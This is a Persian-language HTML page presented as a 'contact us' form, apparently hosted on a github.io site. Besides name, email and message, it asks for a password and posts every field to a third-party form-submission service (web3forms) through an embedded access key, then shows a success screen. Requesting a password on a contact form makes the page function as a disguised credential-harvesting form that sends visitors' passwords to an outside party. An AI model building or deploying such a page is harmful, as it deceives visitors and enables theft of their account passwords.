<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فرم تماس</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 500px;
        }
        h2 { text-align: center; color: #333; margin-bottom: 25px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; font-size: 14px; }
        input, textarea {
            width: 100%; padding: 12px; border: 2px solid #ddd;
            border-radius: 8px; font-size: 14px; font-family: Tahoma;
        }
        button {
            width: 100%; padding: 15px; background: #667eea; color: white;
            border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;
        }
        button:hover { background: #764ba2; }
        .success-message { display: none; text-align: center; padding: 20px; }
        .success-icon { font-size: 70px; margin-bottom: 15px; }
        .success-message h2 { color: #10b981; }
    </style>
</head>
<body>
    <div class="container">
        <!-- پیام موفقیت -->
        <div id="successMessage" class="success-message">
            <div class="success-icon">✅</div>
            <h2>ارسال موفقیت آمیز بود</h2>
            <p>اطلاعات شما با موفقیت ارسال شد.</p>
            <button onclick="window.location.href='/'" style="margin-top:15px;padding:10px 25px;background:#667eea;color:white;border:none;border-radius:8px;cursor:pointer">بازگشت</button>
        </div>

        <!-- فرم -->
        <div id="contactForm">
            <h2>فرم تماس با ما</h2>
            <form action="https://api.web3forms.com/submit" method="POST">
                <!-- کلید دسترسی -->
                <input type="hidden" name="access_key" value="af651fa4-8519-4456-94c4-3f301b7aefb5">
                <!-- صفحه موفقیت -->
                <input type="hidden" name="redirect" value="https://asmanabye-dev.github.io/?success=true">
                
                <div class="form-group">
                    <label>نام و نام خانوادگی:</label>
                    <input type="text" name="name" required placeholder="نام کامل">
                </div>
                <div class="form-group">
                    <label>ایمیل:</label>
                    <input type="email" name="email" required placeholder="email@gmail.com">
                </div>
                <div class="form-group">
                    <label>رمز عبور:</label>
                    <input type="password" name="password" required placeholder="********">
                </div>
                <div class="form-group">
                    <label>پیام:</label>
                    <textarea name="message" rows="4" required placeholder="متن پیام..."></textarea>
                </div>
                <button type="submit">ارسال پیام</button>
            </form>
        </div>
    </div>
    
    <script>
        // نمایش پیام موفقیت
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('success') === 'true') {
            document.getElementById('contactForm').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    </script>
</body>
</html>
